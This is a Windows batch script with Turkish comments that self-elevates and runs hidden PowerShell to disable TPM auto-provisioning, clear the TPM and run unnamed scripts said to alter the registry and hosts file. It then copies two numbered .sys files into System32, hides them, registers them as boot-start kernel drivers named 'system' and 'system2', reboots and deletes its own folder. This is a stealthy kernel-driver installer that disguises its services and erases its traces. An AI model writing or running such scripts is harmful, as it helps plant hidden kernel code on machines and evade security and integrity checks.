@echo off
setlocal

:: Yönetici izni kontrolü ve komut dosyasının yönetici olarak çalıştırılması
openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

:: TPM ayarları
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Disable-TpmAutoProvisioning'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command Clear-Tpm'"

:: Reg ve hosts script'lerini çalıştır
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"C:\Windows\System32\1.ps1\"'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"C:\Windows\System32\2.ps1\"'"

:: Dosyaları System32 klasörüne kopyala
set "sys32Dir=C:\Windows\System32"

if exist "%~dp053259239.sys" (
    copy /y "%~dp053259239.sys" "%sys32Dir%"
)
if exist "%~dp086436432.sys" (
    copy /y "%~dp086436432.sys" "%sys32Dir%"
)

:: Dosyaları sistem dosyası olarak ayarla ve gizle
attrib +s +h "%sys32Dir%\53259239.sys"
attrib +s +h "%sys32Dir%\86436432.sys"

:: Yeni servisleri oluştur (System32 klasöründen çalıştırılacak şekilde)
sc create system binPath= "C:\Windows\System32\53259239.sys" DisplayName= "system" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
sc create system2 binPath= "C:\Windows\System32\86436432.sys" DisplayName= "system2" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1

:: Servisleri başlat
sc start system
sc start system2

shutdown /r /t 2

:: Script dosyasını temizle
cd /d "%~dp0"
del /f /q *.*
for /d %%i in (*) do rd /s /q "%%i"

exit
